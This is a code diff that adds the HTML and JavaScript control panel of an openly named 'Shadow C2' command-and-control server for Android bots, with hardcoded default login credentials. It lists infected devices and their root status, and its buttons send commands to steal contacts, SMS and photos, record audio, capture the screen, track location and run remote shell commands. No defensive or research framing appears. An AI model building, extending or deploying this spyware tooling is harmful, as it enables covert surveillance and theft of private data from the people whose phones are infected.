@@ -1,0 +1,484 @@
+<!-- public/dashboard.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shadow C2 - Control Panel</title>
+    <script src="/socket.io/socket.io.js"></script>
+    <style>
+        :root {
+            --primary: #2d3748;
+            --secondary: #4a5568;
+            --accent: #e53e3e;
+            --success: #38a169;
+            --warning: #d69e2e;
+            --text: #e2e8f0;
+            --background: #1a202c;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Courier New', monospace;
+            background: var(--background);
+            color: var(--text);
+            overflow-x: hidden;
+        }
+        
+        .login-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #1a202c 0%, #2d3748 100%);
+        }
+        
+        .login-form {
+            background: var(--primary);
+            padding: 2rem;
+            border-radius: 10px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            width: 100%;
+            max-width: 400px;
+        }
+        
+        .login-form h2 {
+            text-align: center;
+            margin-bottom: 1.5rem;
+            color: var(--accent);
+        }
+        
+        .form-group {
+            margin-bottom: 1rem;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 0.75rem;
+            background: var(--secondary);
+            border: 1px solid #4a5568;
+            border-radius: 5px;
+            color: var(--text);
+        }
+        
+        .btn {
+            background: var(--accent);
+            color: white;
+            border: none;
+            padding: 0.75rem 1.5rem;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 1rem;
+        }
+        
+        .dashboard {
+            display: none;
+        }
+        
+        .header {
+            background: var(--primary);
+            padding: 1rem 2rem;
+            border-bottom: 2px solid var(--accent);
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1rem;
+            padding: 1rem 2rem;
+        }
+        
+        .stat-card {
+            background: var(--primary);
+            padding: 1.5rem;
+            border-radius: 8px;
+            border-left: 4px solid var(--accent);
+        }
+        
+        .stat-card h3 {
+            color: var(--accent);
+            margin-bottom: 0.5rem;
+        }
+        
+        .main-content {
+            display: grid;
+            grid-template-columns: 300px 1fr;
+            gap: 1rem;
+            padding: 1rem 2rem;
+            height: calc(100vh - 200px);
+        }
+        
+        .bot-list {
+            background: var(--primary);
+            border-radius: 8px;
+            overflow-y: auto;
+        }
+        
+        .bot-item {
+            padding: 1rem;
+            border-bottom: 1px solid var(--secondary);
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        
+        .bot-item:hover {
+            background: var(--secondary);
+        }
+        
+        .bot-item.active {
+            background: var(--accent);
+        }
+        
+        .command-panel {
+            background: var(--primary);
+            border-radius: 8px;
+            padding: 1rem;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .command-buttons {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 0.5rem;
+            margin-bottom: 1rem;
+        }
+        
+        .cmd-btn {
+            background: var(--secondary);
+            border: none;
+            color: var(--text);
+            padding: 0.5rem 1rem;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        
+        .cmd-btn:hover {
+            background: var(--accent);
+        }
+        
+        .output-panel {
+            flex: 1;
+            background: #000;
+            border-radius: 5px;
+            padding: 1rem;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+        }
+        
+        .log-entry {
+            margin-bottom: 0.5rem;
+            padding: 0.25rem;
+            border-left: 3px solid var(--success);
+        }
+        
+        .log-entry.error {
+            border-left-color: var(--accent);
+        }
+        
+        .log-entry.warning {
+            border-left-color: var(--warning);
+        }
+    </style>
+</head>
+<body>
+    <!-- Login Screen -->
+    <div id="loginScreen" class="login-container">
+        <div class="login-form">
+            <h2>🔒 SHADOW C2 ACCESS</h2>
+            <form id="loginForm">
+                <div class="form-group">
+                    <label>Username:</label>
+                    <input type="text" id="username" value="admin" required>
+                </div>
+                <div class="form-group">
+                    <label>Password:</label>
+                    <input type="password" id="password" value="shadow2024" required>
+                </div>
+                <button type="submit" class="btn">ACCESS CONTROL PANEL</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Main Dashboard -->
+    <div id="dashboard" class="dashboard">
+        <div class="header">
+            <h1>🕶️ SHADOW C2 CONTROL PANEL</h1>
+            <div id="connectionStatus">🔴 Disconnected</div>
+        </div>
+        
+        <div class="stats">
+            <div class="stat-card">
+                <h3>Connected Bots</h3>
+                <div id="botCount">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Online Now</h3>
+                <div id="onlineCount">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Rooted Devices</h3>
+                <div id="rootedCount">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Data Collected</h3>
+                <div id="dataCount">0 MB</div>
+            </div>
+        </div>
+        
+        <div class="main-content">
+            <!-- Bot List -->
+            <div class="bot-list" id="botList">
+                <div class="bot-item" data-bot-id="none">
+                    <strong>Select a bot to control</strong>
+                </div>
+            </div>
+            
+            <!-- Command Panel -->
+            <div class="command-panel">
+                <div class="command-buttons">
+                    <button class="cmd-btn" onclick="sendCommand('GET_INFO')">Get Device Info</button>
+                    <button class="cmd-btn" onclick="sendCommand('EXFILTRATE_CONTACTS')">Steal Contacts</button>
+                    <button class="cmd-btn" onclick="sendCommand('EXFILTRATE_SMS')">Steal SMS</button>
+                    <button class="cmd-btn" onclick="sendCommand('EXFILTRATE_GALLERY')">Steal Gallery</button>
+                    <button class="cmd-btn" onclick="sendCommand('START_AUDIO')">Record Audio</button>
+                    <button class="cmd-btn" onclick="sendCommand('CAPTURE_SCREEN')">Capture Screen</button>
+                    <button class="cmd-btn" onclick="sendCommand('GET_LOCATION')">Get Location</button>
+                    <button class="cmd-btn" onclick="sendCommand('SHELL')">Remote Shell</button>
+                    <button class="cmd-btn" onclick="sendCommand('UPDATE')">Update Bot</button>
+                </div>
+                
+                <div class="form-group">
+                    <label>Custom Command:</label>
+                    <input type="text" id="customCommand" placeholder="Enter shell command...">
+                    <button class="cmd-btn" onclick="sendCustomCommand()">Execute</button>
+                </div>
+                
+                <div class="output-panel" id="outputPanel">
+                    <div class="log-entry">🕶️ Shadow C2 Control Panel Ready</div>
+                    <div class="log-entry">📍 Waiting for bot connections...</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let socket = null;
+        let currentBot = null;
+        let authToken = null;
+
+        // Login functionality
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            try {
+                const response = await fetch('/auth', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password })
+                });
+                
+                const data = await response.json();
+                
+                if (response.ok) {
+                    authToken = data.token;
+                    document.getElementById('loginScreen').style.display = 'none';
+                    document.getElementById('dashboard').style.display = 'block';
+                    initializeSocket();
+                } else {
+                    alert('Login failed: ' + data.error);
+                }
+            } catch (error) {
+                alert('Connection error: ' + error.message);
+            }
+        });
+
+        // Socket initialization
+        function initializeSocket() {
+            socket = io({
+                extraHeaders: {
+                    Authorization: `Bearer ${authToken}`
+                }
+            });
+
+            socket.on('connect', () => {
+                updateConnectionStatus('🟢 Connected');
+                logMessage('Connected to C2 server');
+            });
+
+            socket.on('disconnect', () => {
+                updateConnectionStatus('🔴 Disconnected');
+                logMessage('Disconnected from server', 'error');
+            });
+
+            socket.on('command_update', (data) => {
+                logMessage(`Command executed: ${data.commandData} - Result: ${data.result}`, 'success');
+            });
+
+            socket.on('data_update', (data) => {
+                logMessage(`Data received: ${data.type} from ${data.botId}`, 'success');
+                updateStats();
+            });
+
+            // Load initial bots
+            loadBots();
+        }
+
+        // Bot management
+        async function loadBots() {
+            try {
+                const response = await fetch('/api/bots', {
+                    headers: { Authorization: `Bearer ${authToken}` }
+                });
+                const bots = await response.json();
+                
+                const botList = document.getElementById('botList');
+                botList.innerHTML = '<div class="bot-item" data-bot-id="none"><strong>Select a bot to control</strong></div>';
+                
+                bots.forEach(bot => {
+                    const botElement = document.createElement('div');
+                    botElement.className = 'bot-item';
+                    botElement.dataset.botId = bot.bot_id;
+                    botElement.innerHTML = `
+                        <strong>${bot.device_model || 'Unknown Device'}</strong><br>
+                        <small>ID: ${bot.bot_id}</small><br>
+                        <small>Android: ${bot.android_version || 'Unknown'}</small><br>
+                        <small>Last seen: ${new Date(bot.last_seen).toLocaleString()}</small>
+                        ${bot.is_rooted ? '<br><small style="color: #e53e3e;">🔓 ROOTED</small>' : ''}
+                    `;
+                    
+                    botElement.addEventListener('click', () => selectBot(bot.bot_id));
+                    botList.appendChild(botElement);
+                });
+                
+                updateStats();
+            } catch (error) {
+                logMessage('Error loading bots: ' + error.message, 'error');
+            }
+        }
+
+        function selectBot(botId) {
+            currentBot = botId;
+            document.querySelectorAll('.bot-item').forEach(item => {
+                item.classList.remove('active');
+            });
+            document.querySelector(`[data-bot-id="${botId}"]`).classList.add('active');
+            logMessage(`Selected bot: ${botId}`);
+        }
+
+        // Command sending
+        function sendCommand(commandType) {
+            if (!currentBot || currentBot === 'none') {
+                alert('Please select a bot first');
+                return;
+            }
+
+            fetch('/api/command', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': `Bearer ${authToken}`
+                },
+                body: JSON.stringify({
+                    botId: currentBot,
+                    commandType: commandType,
+                    commandData: commandType
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    logMessage(`Command sent: ${commandType} to ${currentBot}`);
+                } else {
+                    logMessage(`Failed to send command: ${data.error}`, 'error');
+                }
+            })
+            .catch(error => {
+                logMessage(`Error sending command: ${error.message}`, 'error');
+            });
+        }
+
+        function sendCustomCommand() {
+            const command = document.getElementById('customCommand').value;
+            if (!command.trim()) return;
+            
+            if (!currentBot || currentBot === 'none') {
+                alert('Please select a bot first');
+                return;
+            }
+
+            fetch('/api/command', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': `Bearer ${authToken}`
+                },
+                body: JSON.stringify({
+                    botId: currentBot,
+                    commandType: 'SHELL',
+                    commandData: command
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    logMessage(`Shell command sent: ${command}`);
+                    document.getElementById('customCommand').value = '';
+                } else {
+                    logMessage(`Failed to send command: ${data.error}`, 'error');
+                }
+            });
+        }
+
+        // Utility functions
+        function updateConnectionStatus(status) {
+            document.getElementById('connectionStatus').textContent = status;
+        }
+
+        function logMessage(message, type = 'info') {
+            const outputPanel = document.getElementById('outputPanel');
+            const logEntry = document.createElement('div');
+            logEntry.className = `log-entry ${type}`;
+            logEntry.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
+            outputPanel.appendChild(logEntry);
+            outputPanel.scrollTop = outputPanel.scrollHeight;
+        }
+
+        async function updateStats() {
+            try {
+                const response = await fetch('/api/bots', {
+                    headers: { Authorization: `Bearer ${authToken}` }
+                });
+                const bots = await response.json();
+                
+                document.getElementById('botCount').textContent = bots.length;
+                document.getElementById('onlineCount').textContent = bots.filter(b => 
+                    new Date() - new Date(b.last_seen) < 300000
+                ).length;
+                document.getElementById('rootedCount').textContent = bots.filter(b => b.is_rooted).length;
+            } catch (error) {
+                console.error('Error updating stats:', error);
+            }
+        }
+
+        // Auto-refresh bots every 10 seconds
+        setInterval(loadBots, 10000);
+    </script>
+</body>
+</html>
